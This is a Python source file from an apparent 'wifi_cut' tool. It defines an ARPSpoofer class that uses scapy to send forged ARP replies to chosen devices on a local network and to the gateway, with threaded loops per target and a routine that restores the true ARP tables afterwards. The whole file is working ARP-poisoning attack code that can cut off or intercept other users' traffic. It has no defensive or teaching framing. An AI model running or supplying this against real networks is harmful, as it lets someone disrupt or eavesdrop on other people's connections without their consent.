import threading
import time

from scapy.all import Ether, ARP, sendp, get_if_hwaddr

from wifi_cut.gateway import GatewayInfo
from wifi_cut.scanner import Device


class ARPSpoofer:
    def __init__(self, gateway: GatewayInfo):
        self.gateway = gateway
        self.targets: dict[str, Device] = {}
        self._running = False
        self._threads: dict[str, threading.Thread] = {}
        self._lock = threading.Lock()
        self._local_mac = get_if_hwaddr(gateway.interface)
        self._packet_count = 0
        self._interval: float = 1.5

    def add_target(self, device: Device) -> None:
        if device.ip == self.gateway.ip:
            print(f"[!] 不能將閘道器 ({device.ip}) 設為目標")
            return
        with self._lock:
            self.targets[device.ip] = device
            if self._running and device.ip not in self._threads:
                t = threading.Thread(
                    target=self._spoof_loop,
                    args=(device.ip, self._interval),
                    daemon=True,
                )
                self._threads[device.ip] = t
                t.start()

    def remove_target(self, ip: str) -> None:
        with self._lock:
            device = self.targets.pop(ip, None)
        if device and self._running:
            self._restore_arp(device)

    def start(self, interval: float = 1.5) -> None:
        self._running = True
        self._interval = interval
        with self._lock:
            for ip, device in self.targets.items():
                t = threading.Thread(
                    target=self._spoof_loop,
                    args=(ip, interval),
                    daemon=True
                )
                self._threads[ip] = t
                t.start()

    def stop(self) -> None:
        self._running = False
        for t in self._threads.values():
            t.join(timeout=5)
        self._threads.clear()
        self.restore_all()

    def restore_all(self) -> None:
        with self._lock:
            targets = list(self.targets.values())
        for device in targets:
            self._restore_arp(device)

    def _spoof_loop(self, target_ip: str, interval: float) -> None:
        while self._running:
            with self._lock:
                device = self.targets.get(target_ip)
            if not device:
                break

            pkt_to_target = (
                Ether(dst=device.mac, src=self._local_mac)
                / ARP(
                    op=2,
                    psrc=self.gateway.ip,
                    hwsrc=self._local_mac,
                    pdst=device.ip,
                    hwdst=device.mac,
                )
            )

            pkt_to_gateway = (
                Ether(dst=self.gateway.mac, src=self._local_mac)
                / ARP(
                    op=2,
                    psrc=device.ip,
                    hwsrc=self._local_mac,
                    pdst=self.gateway.ip,
                    hwdst=self.gateway.mac,
                )
            )

            sendp(pkt_to_target, iface=self.gateway.interface, verbose=False)
            sendp(pkt_to_gateway, iface=self.gateway.interface, verbose=False)
            self._packet_count += 2

            time.sleep(interval)

    def _restore_arp(self, device: Device) -> None:
        """發送正確的 ARP 封包還原目標和閘道器的 ARP 表。"""
        print(f"[*] 還原 {device.ip} ({device.mac}) ...")

        restore_target = (
            Ether(dst=device.mac, src=self.gateway.mac)
            / ARP(
                op=2,
                psrc=self.gateway.ip,
                hwsrc=self.gateway.mac,
                pdst=device.ip,
                hwdst=device.mac,
            )
        )

        restore_gateway = (
            Ether(dst=self.gateway.mac, src=device.mac)
            / ARP(
                op=2,
                psrc=device.ip,
                hwsrc=device.mac,
                pdst=self.gateway.ip,
                hwdst=self.gateway.mac,
            )
        )

        sendp(restore_target, iface=self.gateway.interface, count=5, inter=0.3, verbose=False)
        sendp(restore_gateway, iface=self.gateway.interface, count=5, inter=0.3, verbose=False)
        print(f"[+] {device.ip} 已還原")

    @property
    def packet_count(self) -> int:
        return self._packet_count
